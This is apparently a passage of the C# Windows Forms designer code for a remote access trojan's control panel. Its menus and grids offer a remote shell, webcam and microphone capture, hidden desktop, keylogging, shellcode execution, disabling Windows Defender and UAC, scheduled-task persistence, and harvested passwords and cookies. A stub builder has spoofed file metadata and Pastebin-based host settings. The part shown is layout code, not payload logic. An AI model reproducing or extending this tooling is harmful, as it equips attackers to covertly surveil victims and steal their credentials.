		((System.ComponentModel.ISupportInitialize)this.gridViewLog).BeginInit();
		this.xtraTabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).BeginInit();
		this.panelControl2.SuspendLayout();
		this.xtraTabPage3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlTask).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewTask).BeginInit();
		this.xtraTabPage4.SuspendLayout();
		this.tableLayoutPanel1.SuspendLayout();
		this.panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listViewRecoveryClients).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage7.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splitContainer3).BeginInit();
		this.splitContainer3.Panel1.SuspendLayout();
		this.splitContainer3.Panel2.SuspendLayout();
		this.splitContainer3.SuspendLayout();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.txtPasswordSearch.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkAll.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlRecoveryPassword).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewRecoveryPassword).BeginInit();
		this.xtraTabPage8.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlCookie).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewCookie).BeginInit();
		this.xtraTabPage9.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlHistory).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewHistory).BeginInit();
		this.xtraTabPage10.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlBookmarks).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewBookmarks).BeginInit();
		this.xtraTabPage11.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlAutofill).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewAutofill).BeginInit();
		this.xtraTabPage5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splitContainer2).BeginInit();
		this.splitContainer2.Panel1.SuspendLayout();
		this.splitContainer2.Panel2.SuspendLayout();
		this.splitContainer2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listViewGrabClients).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlGraber).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewGraber).BeginInit();
		this.xtraTabPage6.SuspendLayout();
		this.xtraScrollableControl1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl3).BeginInit();
		this.xtraTabControl3.SuspendLayout();
		this.xtraTabPage13.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.groupControl1).BeginInit();
		this.groupControl1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listBoxIP).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtPaste_bin.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkPaste_bin.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.textIP.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl4).BeginInit();
		this.groupControl4.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.comboBoxFolder.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numDelay.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtMutex.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtGroup.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.textFilename.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkAntiProcess.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkAnti.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkBsod.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.checkBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.radioGroupArchitecture.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl2).BeginInit();
		this.groupControl2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listBoxPort).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.textPort.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl3).BeginInit();
		this.groupControl3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.txtFileVersion.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtProductVersion.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtOriginalFilename.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtTrademarks.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtCopyright.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtProduct.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtIcon.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtCompany.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkIcon.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.txtDescription.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.btnAssembly.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picIcon).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuClient).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuRecovery).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuTask).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuScreen).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuLog).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		base.SuspendLayout();
		this.UpdateUI.Enabled = true;
		this.UpdateUI.Interval = 500;
		this.UpdateUI.Tick += new System.EventHandler(UpdateUI_Tick);
		this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
		this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
		this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
		this.performanceCounter1.CategoryName = "Processor";
		this.performanceCounter1.CounterName = "% Processor Time";
		this.performanceCounter1.InstanceName = "_Total";
		this.performanceCounter2.CategoryName = "Memory";
		this.performanceCounter2.CounterName = "% Committed Bytes In Use";
		this.TimerTask.Enabled = true;
		this.TimerTask.Interval = 5000;
		this.TimerTask.Tick += new System.EventHandler(TimerTask_Tick);
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.HeaderOrientation = DevExpress.XtraTab.TabOrientation.Horizontal;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(1432, 655);
		this.xtraTabControl1.TabIndex = 6;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[7] { this.xtraTabPage1, this.xtraTabPage12, this.xtraTabPage2, this.xtraTabPage3, this.xtraTabPage4, this.xtraTabPage5, this.xtraTabPage6 });
		this.xtraTabPage1.Controls.Add(this.splitContainer4);
		this.xtraTabPage1.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage1.ImageOptions.Image");
		this.xtraTabPage1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage1.Text = " Dashboard";
		this.splitContainer4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splitContainer4.FixedPanel = System.Windows.Forms.FixedPanel.Panel1;
		this.splitContainer4.Location = new System.Drawing.Point(0, 0);
		this.splitContainer4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.splitContainer4.Name = "splitContainer4";
		this.splitContainer4.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splitContainer4.Panel1.Controls.Add(this.panel3);
		this.splitContainer4.Panel2.Controls.Add(this.gridControlClient);
		this.splitContainer4.Size = new System.Drawing.Size(1430, 623);
		this.splitContainer4.SplitterDistance = 27;
		this.splitContainer4.SplitterWidth = 3;
		this.splitContainer4.TabIndex = 11;
		this.panel3.Controls.Add(this.textEditSearch);
		this.panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel3.Location = new System.Drawing.Point(0, 0);
		this.panel3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel3.Name = "panel3";
		this.panel3.Size = new System.Drawing.Size(1430, 27);
		this.panel3.TabIndex = 12;
		this.textEditSearch.Dock = System.Windows.Forms.DockStyle.Top;
		this.textEditSearch.Location = new System.Drawing.Point(0, 0);
		this.textEditSearch.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textEditSearch.MenuManager = this.barManager1;
		this.textEditSearch.Name = "textEditSearch";
		this.textEditSearch.Properties.ContextImageOptions.Image = (System.Drawing.Image)resources.GetObject("textEditSearch.Properties.ContextImageOptions.Image");
		this.textEditSearch.Size = new System.Drawing.Size(1430, 28);
		toolTipItem.AllowHtmlText = DevExpress.Utils.DefaultBoolean.True;
		toolTipItem.Text = "<b>Search By: IP Address, Note, PC-Name, Username.</b>";
		superToolTip.Items.Add(toolTipItem);
		this.textEditSearch.SuperTip = superToolTip;
		this.textEditSearch.TabIndex = 12;
		this.textEditSearch.TextChanged += new System.EventHandler(textEditSearch_TextChanged);
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[93]
		{
			this.initallpluginmenu, this.barSubItem1, this.groupbydefaultmenu, this.groupByLocationMenu, this.GroupByOSMenu, this.GroupbyAntivirusMenu, this.GroupByNoteMenu, this.barButtonItem7, this.barSubItem2, this.barSubItem3,
			this.barSubItem4, this.barSubItem5, this.barSubItem6, this.barSubItem7, this.barSubItem8, this.AddNoteMenu, this.GotoSettingMenu, this.RemoteShellMenu, this.RemoteDesktopMenu, this.RemoteCameraMenu,
			this.RegEditMenu, this.FileManagerMenu, this.ProcManagerMenu, this.NetstatMenu, this.RecordMenu, this.barSubItem9, this.RunShellCodeMenu, this.SendMessageBoxMenu, this.VisitWebSiteMenu, this.ChangeBackMenu,
			this.KeyLogMenu, this.FileSearcherMenu, this.ReverseProxyMenu, this.FunMenu, this.barSubItem10, this.ShutDownMenu, this.RestartSystemMenu, this.LogoutSystemMenu, this.StopStubMenu, this.RestartStubMenu,
			this.NoSystemStubMenu, this.UpdateStubMenu, this.UninstallStubMenu, this.ClientFolderMenu, this.DisableWDMenu, this.DisableRecoveryMenu, this.DisableUACMenu, this.CleanUpMenu, this.FodHelperMenu, this.RunAsMenu,
			this.CompLauncherMenu, this.SchTaskInstallStubMenu, this.SchTaskUnInstallStubMenu, this.NormalInstallStubMenu, this.NormalUnInstallStubMenu, this.LoadGeneralInfoMenu, this.LoadRecoveryInfoMenu, this.LoadAnalyzedInfoMenu, this.LoadKeyLogInfoMenu, this.SendFileFromUrlMenu,
			this.SendFileToDiskMenu, this.SendFileToMemoryMenu, this.SaveAllPassword, this.SaveAllCookies, this.SaveAllHistory, this.SaveAllAutoFill, this.SaveAllBookmarks, this.RefreshRecoveryMenu, this.Task_SendFileFromUrl, this.TaskSendFileTODiskMenu,
			this.TaskSendFileToMemoryMenu, this.TaskDisableUACMenu, this.TaskDisableWDMenu, this.TaskInstallSchTaskMenu, this.TaskUpdateAllMenu, this.TaskAutoKeyloggerMenu, this.TaskFakeBinderMenu, this.TaskDeleteMenu, this.TaskLoadStealDataMenu, this.TaskLoadRecoveryDataMenu,
			this.StartScreenMenu, this.StopScreenMenu, this.ClearLogMenu, this.SelectAllMenu, this.OpenHvncMenu, this.CopyIpMenu, this.barSubItem11, this.barSubItem12, this.TaskOfflineKeylogMenu, this.TimerKeyLogStartMenu,
			this.TimerKeyLogStopMenu, this.TimerKeyLogSettingMenu, this.TaskTimerKeylogMenu
		});
		this.barManager1.MaxItemId = 93;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlTop.Size = new System.Drawing.Size(1432, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 683);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlBottom.Size = new System.Drawing.Size(1432, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 683);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(1432, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlRight.Size = new System.Drawing.Size(0, 683);
		this.initallpluginmenu.Caption = "Init All Plugins";
		this.initallpluginmenu.Id = 0;
		this.initallpluginmenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("initallpluginmenu.ImageOptions.SvgImage");
		this.initallpluginmenu.Name = "initallpluginmenu";
		this.initallpluginmenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(initallpluginmenu_ItemClick);
		this.barSubItem1.Caption = "Group View";
		this.barSubItem1.Id = 1;
		this.barSubItem1.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem1.ImageOptions.SvgImage");
		this.barSubItem1.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[5]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.groupbydefaultmenu, true),
			new DevExpress.XtraBars.LinkPersistInfo(this.groupByLocationMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GroupByOSMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GroupbyAntivirusMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GroupByNoteMenu)
		});
		this.barSubItem1.Name = "barSubItem1";
		this.groupbydefaultmenu.Caption = "Default";
		this.groupbydefaultmenu.Id = 2;
		this.groupbydefaultmenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("groupbydefaultmenu.ImageOptions.SvgImage");
		this.groupbydefaultmenu.Name = "groupbydefaultmenu";
		this.groupbydefaultmenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(groupbydefaultmenu_ItemClick);
		this.groupByLocationMenu.Caption = "Location";
		this.groupByLocationMenu.Id = 3;
		this.groupByLocationMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("groupByLocationMenu.ImageOptions.SvgImage");
		this.groupByLocationMenu.Name = "groupByLocationMenu";
		this.groupByLocationMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(groupByLocationMenu_ItemClick);
		this.GroupByOSMenu.Caption = "Operating System";
		this.GroupByOSMenu.Id = 4;
		this.GroupByOSMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("GroupByOSMenu.ImageOptions.Image");
		this.GroupByOSMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("GroupByOSMenu.ImageOptions.LargeImage");
		this.GroupByOSMenu.Name = "GroupByOSMenu";
		this.GroupByOSMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GroupByOSMenu_ItemClick);
		this.GroupbyAntivirusMenu.Caption = "AntiVirus";
		this.GroupbyAntivirusMenu.Id = 5;
		this.GroupbyAntivirusMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("GroupbyAntivirusMenu.ImageOptions.Image");
		this.GroupbyAntivirusMenu.Name = "GroupbyAntivirusMenu";
		this.GroupbyAntivirusMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GroupbyAntivirusMenu_ItemClick);
		this.GroupByNoteMenu.Caption = "Note";
		this.GroupByNoteMenu.Id = 6;
		this.GroupByNoteMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("GroupByNoteMenu.ImageOptions.SvgImage");
		this.GroupByNoteMenu.Name = "GroupByNoteMenu";
		this.GroupByNoteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GroupByNoteMenu_ItemClick);
		this.barButtonItem7.Caption = "barButtonItem7";
		this.barButtonItem7.Id = 7;
		this.barButtonItem7.Name = "barButtonItem7";
		this.barSubItem2.Caption = "Computer Management";
		this.barSubItem2.Id = 8;
		this.barSubItem2.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("barSubItem2.ImageOptions.Image");
		this.barSubItem2.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[8]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.RemoteDesktopMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.NetstatMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ProcManagerMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.FileManagerMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RemoteCameraMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RemoteShellMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RecordMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RegEditMenu)
		});
		this.barSubItem2.Name = "barSubItem2";
		this.RemoteDesktopMenu.Caption = "Desktop Monitor";
		this.RemoteDesktopMenu.Id = 18;
		this.RemoteDesktopMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RemoteDesktopMenu.ImageOptions.Image");
		this.RemoteDesktopMenu.Name = "RemoteDesktopMenu";
		this.RemoteDesktopMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RemoteDesktopMenu_ItemClick);
		this.NetstatMenu.Caption = "Network Statistics";
		this.NetstatMenu.Id = 23;
		this.NetstatMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("NetstatMenu.ImageOptions.Image");
		this.NetstatMenu.Name = "NetstatMenu";
		this.NetstatMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(NetstatMenu_ItemClick);
		this.ProcManagerMenu.Caption = "Process Manager";
		this.ProcManagerMenu.Id = 22;
		this.ProcManagerMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("ProcManagerMenu.ImageOptions.Image");
		this.ProcManagerMenu.Name = "ProcManagerMenu";
		this.ProcManagerMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ProcManagerMenu_ItemClick);
		this.FileManagerMenu.Caption = "File Manager";
		this.FileManagerMenu.Id = 21;
		this.FileManagerMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("FileManagerMenu.ImageOptions.Image");
		this.FileManagerMenu.Name = "FileManagerMenu";
		this.FileManagerMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(FileManagerMenu_ItemClick);
		this.RemoteCameraMenu.Caption = "Web Camera";
		this.RemoteCameraMenu.Id = 19;
		this.RemoteCameraMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RemoteCameraMenu.ImageOptions.Image");
		this.RemoteCameraMenu.Name = "RemoteCameraMenu";
		this.RemoteCameraMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RemoteCameraMenu_ItemClick);
		this.RemoteShellMenu.Caption = "Open CMD";
		this.RemoteShellMenu.Id = 17;
		this.RemoteShellMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RemoteShellMenu.ImageOptions.Image");
		this.RemoteShellMenu.Name = "RemoteShellMenu";
		this.RemoteShellMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RemoteShellMenu_ItemClick);
		this.RecordMenu.Caption = "Mic Record";
		this.RecordMenu.Id = 24;
		this.RecordMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("RecordMenu.ImageOptions.SvgImage");
		this.RecordMenu.Name = "RecordMenu";
		this.RecordMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RecordMenu_ItemClick);
		this.RegEditMenu.Caption = "Regedit";
		this.RegEditMenu.Id = 20;
		this.RegEditMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RegEditMenu.ImageOptions.Image");
		this.RegEditMenu.Name = "RegEditMenu";
		this.RegEditMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RegEditMenu_ItemClick);
		this.barSubItem3.Caption = "Client Control";
		this.barSubItem3.Id = 9;
		this.barSubItem3.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem3.ImageOptions.SvgImage");
		this.barSubItem3.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[5]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.RunShellCodeMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.SendMessageBoxMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.VisitWebSiteMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ChangeBackMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.FileSearcherMenu)
		});
		this.barSubItem3.Name = "barSubItem3";
		this.RunShellCodeMenu.Caption = "Run Shellcode";
		this.RunShellCodeMenu.Id = 26;
		this.RunShellCodeMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("RunShellCodeMenu.ImageOptions.SvgImage");
		this.RunShellCodeMenu.Name = "RunShellCodeMenu";
		this.RunShellCodeMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RunShellCodeMenu_ItemClick);
		this.SendMessageBoxMenu.Caption = "Message Box";
		this.SendMessageBoxMenu.Id = 27;
		this.SendMessageBoxMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("SendMessageBoxMenu.ImageOptions.Image");
		this.SendMessageBoxMenu.Name = "SendMessageBoxMenu";
		this.SendMessageBoxMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SendMessageBoxMenu_ItemClick);
		this.VisitWebSiteMenu.Caption = "Visit Website";
		this.VisitWebSiteMenu.Id = 28;
		this.VisitWebSiteMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("VisitWebSiteMenu.ImageOptions.SvgImage");
		this.VisitWebSiteMenu.Name = "VisitWebSiteMenu";
		this.VisitWebSiteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(VisitWebSiteMenu_ItemClick);
		this.ChangeBackMenu.Caption = "Change Wallpaper";
		this.ChangeBackMenu.Id = 29;
		this.ChangeBackMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("ChangeBackMenu.ImageOptions.SvgImage");
		this.ChangeBackMenu.Name = "ChangeBackMenu";
		this.ChangeBackMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ChangeBackMenu_ItemClick);
		this.FileSearcherMenu.Caption = "File Searcher";
		this.FileSearcherMenu.Id = 31;
		this.FileSearcherMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("FileSearcherMenu.ImageOptions.SvgImage");
		this.FileSearcherMenu.Name = "FileSearcherMenu";
		this.FileSearcherMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(FileSearcherMenu_ItemClick);
		this.barSubItem4.Caption = "Client Restart";
		this.barSubItem4.Id = 10;
		this.barSubItem4.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem4.ImageOptions.SvgImage");
		this.barSubItem4.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[3]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.LogoutSystemMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RestartSystemMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ShutDownMenu)
		});
		this.barSubItem4.Name = "barSubItem4";
		this.LogoutSystemMenu.Caption = "LogOut";
		this.LogoutSystemMenu.Id = 37;
		this.LogoutSystemMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("LogoutSystemMenu.ImageOptions.SvgImage");
		this.LogoutSystemMenu.Name = "LogoutSystemMenu";
		this.LogoutSystemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(LogoutSystemMenu_ItemClick);
		this.RestartSystemMenu.Caption = "Restart";
		this.RestartSystemMenu.Id = 36;
		this.RestartSystemMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("RestartSystemMenu.ImageOptions.SvgImage");
		this.RestartSystemMenu.Name = "RestartSystemMenu";
		this.RestartSystemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RestartSystemMenu_ItemClick);
		this.ShutDownMenu.Caption = "Shut Down";
		this.ShutDownMenu.Id = 35;
		this.ShutDownMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("ShutDownMenu.ImageOptions.Image");
		this.ShutDownMenu.Name = "ShutDownMenu";
		this.ShutDownMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ShutDownMenu_ItemClick);
		this.barSubItem5.Caption = "WD Bypassing";
		this.barSubItem5.Id = 11;
		this.barSubItem5.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem5.ImageOptions.SvgImage");
		this.barSubItem5.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.DisableWDMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.DisableUACMenu)
		});
		this.barSubItem5.Name = "barSubItem5";
		this.DisableWDMenu.Caption = "Disable WD";
		this.DisableWDMenu.Id = 44;
		this.DisableWDMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("DisableWDMenu.ImageOptions.Image");
		this.DisableWDMenu.Name = "DisableWDMenu";
		this.DisableWDMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DisableWDMenu_ItemClick);
		this.DisableUACMenu.Caption = "Disable UAC";
		this.DisableUACMenu.Id = 46;
		this.DisableUACMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("DisableUACMenu.ImageOptions.Image");
		this.DisableUACMenu.Name = "DisableUACMenu";
		this.DisableUACMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DisableUACMenu_ItemClick);
		this.barSubItem6.Caption = "UAC Privileges";
		this.barSubItem6.Id = 12;
		this.barSubItem6.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("barSubItem6.ImageOptions.Image");
		this.barSubItem6.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.CleanUpMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RunAsMenu)
		});
		this.barSubItem6.Name = "barSubItem6";
		this.CleanUpMenu.Caption = "Privileges Windows 8.1/10/Servers";
		this.CleanUpMenu.Id = 47;
		this.CleanUpMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("CleanUpMenu.ImageOptions.Image");
		this.CleanUpMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("CleanUpMenu.ImageOptions.LargeImage");
		this.CleanUpMenu.Name = "CleanUpMenu";
		this.CleanUpMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CleanUpMenu_ItemClick);
		this.RunAsMenu.Caption = "Privileges Windows 7";
		this.RunAsMenu.Id = 49;
		this.RunAsMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RunAsMenu.ImageOptions.Image");
		this.RunAsMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("RunAsMenu.ImageOptions.LargeImage");
		this.RunAsMenu.Name = "RunAsMenu";
		this.RunAsMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RunAsMenu_ItemClick);
		this.barSubItem7.Caption = "Install Task Schedule";
		this.barSubItem7.Id = 13;
		this.barSubItem7.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("barSubItem7.ImageOptions.Image");
		this.barSubItem7.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.SchTaskInstallStubMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.SchTaskUnInstallStubMenu)
		});
		this.barSubItem7.Name = "barSubItem7";
